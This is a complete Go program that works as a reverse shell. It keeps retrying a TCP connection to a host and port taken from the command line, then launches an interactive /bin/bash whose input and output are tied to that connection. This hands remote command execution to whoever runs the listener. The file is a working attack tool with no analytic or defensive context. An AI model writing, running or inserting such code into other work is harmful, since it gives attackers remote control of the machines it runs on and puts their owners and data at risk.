package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func reverse_shell(host string, port string) {
	var connection net.Conn
	for {
		conn, err := net.Dial("tcp", host+":"+port)
		if err == nil {
			connection = conn
			break
		}
		fmt.Println("Failed to connect to listener, waiting 5 sec before retry...")
		time.Sleep(5 * time.Second)
	}

	// Spawn a shell with bash
	cmd := exec.Command("/bin/bash", "-i")

	// Connect I/O to remote listener
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection

	// Start connection
	cmd.Run()

	// Wait for process
	cmd.Wait()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Example usage: reverseShell 127.0.0.1 8080")
		os.Exit(1)
	}

	host := os.Args[1]
	port := os.Args[2]

	reverse_shell(host, port)
}
